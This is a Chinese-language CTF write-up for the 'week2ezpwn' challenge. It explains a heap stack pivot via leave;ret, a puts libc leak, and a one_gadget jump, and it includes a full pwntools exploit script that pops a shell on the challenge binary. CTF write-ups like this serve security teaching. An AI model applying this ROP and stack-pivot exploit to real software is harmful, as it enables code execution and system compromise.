# week2ezpwn

## 题目简述

程序在堆上准备了可控区域并泄露其地址，同时栈溢出允许覆盖保存的 `rbp` 和返回地址。先用 `leave ; ret` 把栈迁移到堆上的第一阶段 ROP 链，泄露 `puts` 的 libc 地址并返回漏洞函数；第二阶段再跳转到匹配 libc 的 one_gadget。

## 解题过程

第一阶段所需地址为：

```text
pop rdi ; ret = 0x4012a3
leave ; ret   = 0x401192
puts@got      = 0x404018
puts@plt      = 0x401030
vul/start     = 0x401167
```

堆区开头放置 `puts(puts@got)` 的 ROP 链。溢出时把保存的 `rbp` 改为 `fake_stack-8`：函数执行 `leave` 后先从该地址弹出一个占位 `rbp`，紧接着的 `ret` 正好从 `fake_stack` 取出第一条 gadget。

```python
import re
from pwn import *

context.arch = "amd64"
io = process("./main")
libc = ELF("./libc-2.23.so", checksec=False)

pop_rdi = 0x4012a3
leave_ret = 0x401192
puts_got = 0x404018
puts_plt = 0x401030
vul = 0x401167

io.recvline()
io.sendline(flat(pop_rdi, puts_got, puts_plt, vul))

line = io.recvline()
fake_stack = int(re.search(rb"0x[0-9a-fA-F]+", line).group(), 16)
log.success(f"fake stack: {fake_stack:#x}")

io.recvline()
io.send(b"\x00" * 0x50 + p64(fake_stack - 8) + p64(leave_ret))

leaked_puts = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym["puts"]
log.success(f"libc base: {libc.address:#x}")

one_gadget = libc.address + 0xF1207

io.recvline()
io.send(b"\x00" * 0x58 + p64(one_gadget))
io.interactive()
```

`0xF1207` 只适用于题目给出的 libc 2.23。使用前应通过 one_gadget 输出核对寄存器和栈约束；本题预先分配并清零的较大堆块用于给迁移后的调用留出空间并满足相关约束。

## 方法总结

利用链为“泄露堆地址 → 在堆上布置 ROP → 覆盖 `rbp` → `leave ; ret` 迁移 → 泄露 libc → 返回漏洞点 → one_gadget”。`fake_stack-8` 不是任意偏移，而是为 `leave` 中的 `pop rbp` 预留一个槽位。
